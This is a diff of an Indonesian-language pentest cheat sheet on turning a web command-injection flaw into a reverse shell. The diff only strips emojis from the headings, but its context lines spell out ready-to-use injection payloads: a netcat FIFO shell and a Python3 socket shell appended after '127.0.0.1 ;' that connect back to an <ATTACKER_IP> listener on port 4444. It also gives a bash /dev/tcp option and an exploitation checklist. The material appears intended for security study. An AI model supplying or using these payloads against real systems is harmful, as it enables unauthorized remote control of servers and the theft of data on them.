@@ -1,16 +1,16 @@
-# 💉 Reverse Shell via Command Injection
+﻿# Reverse Shell via Command Injection
 
 > **Tujuan:** Memicu **reverse shell** dengan menyuntikkan payload command injection ke aplikasi web target, setelah listener aktif di mesin attacker.
 
 ---
 
-## 📌 Penjelasan Singkat
+## Penjelasan Singkat
 
 Command Injection adalah metode paling cepat untuk mendapatkan akses shell ketika input aplikasi web dieksekusi langsung oleh OS. Payload reverse shell dikirim via input user, lalu target melakukan koneksi balik ke listener attacker.
 
 ---
 
-## 🎧 Langkah 1 — Listener di Attacker
+## Langkah 1 — Listener di Attacker
 
 Jalankan listener **sebelum** payload dikirim:
 
@@ -27,7 +27,7 @@ nc -lvnp 4444
 
 ---
 
-## 🛠️ Langkah 2 — Cek Tools di Target
+## Langkah 2 — Cek Tools di Target
 
 ### Per Tool (Manual)
 
@@ -46,9 +46,9 @@ nc -lvnp 4444
 
 ---
 
-## 💥 Langkah 3 — Pilih Payload Reverse Shell
+## Langkah 3 — Pilih Payload Reverse Shell
 
-### A️⃣ Netcat via Named Pipe (FIFO)
+### A Netcat via Named Pipe (FIFO)
 
 Cocok jika `nc` + `mkfifo` ada, tetapi `nc -e` tidak didukung.
 
@@ -56,13 +56,13 @@ Cocok jika `nc` + `mkfifo` ada, tetapi `nc -e` tidak didukung.
 127.0.0.1 ; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4444 >/tmp/f
 ```
 
-### B️⃣ Python 3 (Paling Stabil)
+### B Python 3 (Paling Stabil)
 
 ```text
 127.0.0.1 ; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
 ```
 
-### C️⃣ Bash Direct (`/dev/tcp`)
+### C Bash Direct (`/dev/tcp`)
 
 Cocok jika `bash` mendukung socket bawaan.
 
@@ -72,7 +72,7 @@ Cocok jika `bash` mendukung socket bawaan.
 
 ---
 
-## 🔄 Alur Reverse Shell
+## Alur Reverse Shell
 
 ```text
 Attacker
@@ -88,7 +88,7 @@ Target (input command injection)
 
 ---
 
-## 🪜 Alur Eksploitasi
+## Alur Eksploitasi
 
 ```text
 1. Nyalakan listener di attacker (nc -lvnp 4444)
@@ -101,7 +101,7 @@ Target (input command injection)
 
 ---
 
-## ⚠️ Catatan Penting
+## Catatan Penting
 
 - **Jalankan listener dulu** sebelum mengirim payload.
 - **Sesuaikan IP** `10.10.10.7` dengan IP attacker Anda.
@@ -110,7 +110,7 @@ Target (input command injection)
 
 ---
 
-## 📋 Checklist Command Injection → Reverse Shell
+## Checklist Command Injection → Reverse Shell
 
 - [ ] Nyalakan listener di attacker (`nc -lvnp 4444`).
 - [ ] Cek tools di target (`which nc`, `which python3`, dll).
@@ -122,7 +122,7 @@ Target (input command injection)
 
 ---
 
-## 📚 Referensi
+## Referensi
 
 - [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
 - [PentestMonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
